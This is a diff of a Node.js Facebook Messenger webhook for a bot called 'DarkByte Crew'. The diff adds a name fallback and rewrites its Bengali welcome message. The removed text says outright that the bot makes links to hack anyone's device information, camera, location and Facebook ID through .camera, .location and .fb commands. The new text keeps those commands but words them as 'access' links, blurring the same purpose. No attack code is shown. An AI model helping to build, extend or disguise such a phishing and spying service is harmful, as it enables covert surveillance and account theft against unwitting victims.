@@ -63,7 +63,7 @@ router.post('/webhook', async (req, res) => {
             if (!user) {
                 // ইউজারের প্রোফাইল থেকে ফুল নাম সংগ্রহ করি
                 const profile = await getUserProfile(senderId);
-                const fullName = profile?.name || 'বন্ধু';
+                const fullName = profile?.name || (profile?.first_name && profile?.last_name ? `${profile.first_name} ${profile.last_name}` : 'বন্ধু');
 
                 user = new User({
                     fbId: senderId,
@@ -76,15 +76,17 @@ router.post('/webhook', async (req, res) => {
                 // নতুন ইউজারের জন্য ওয়েলকাম মেসেজ (আপনার দেওয়া ফরম্যাট)
                 const introMsg = `আসসালামু আলাইকুম, ${fullName}! 👋
 
-⚡ DarkByte Crew বটে আপনাকে স্বাগতম। 🥳
-আপনি এই বটের মাধ্যমে খুব সহজেই যে কারো ডিভাইসের ইনফোরমেশন, ক্যামেরা, লোকেশন এবং ফেসবুক আইডি হ্যাক করতে পারবেন।💯
+DarkByte Crew বটে আপনাকে স্বাগতম! 🥳
 
-আমাদের কমান্ড গুলোঃ
-📷️ .camera - ক্যামেরা হ্যাকের লিঙ্ক তৈরি করুন
-🗾 .location - লোকেশন হ্যাকের লিঙ্ক তৈরি করুন
-🔥 .fb - ফেসবুক আইডি হ্যাকের লিঙ্ক তৈরি করুন
+এই বটের মাধ্যমে আপনি খুব সহজেই ডিভাইসের ইনফরমেশন, ক্যামেরা, লোকেশন এবং ফেসবুক অ্যাকাউন্ট অ্যাক্সেস করার লিংক তৈরি করতে পারবেন। 💯
 
-Owner : m.me/2ndJohnnySins`;
+⚙️ আমাদের কমান্ডসমূহ:
+━━━━━━━━━━━━━━━━━━━━
+📷 .camera — ক্যামেরা লিংক তৈরি করুন
+📍 .location — লোকেশন লিংক তৈরি করুন
+👤 .fb — ফেসবুক আইডি লিংক তৈরি করুন
+
+🔗 Owner: m.me/2ndJohnnySins`;
 
                 await sendMessage(senderId, introMsg);
                 continue;
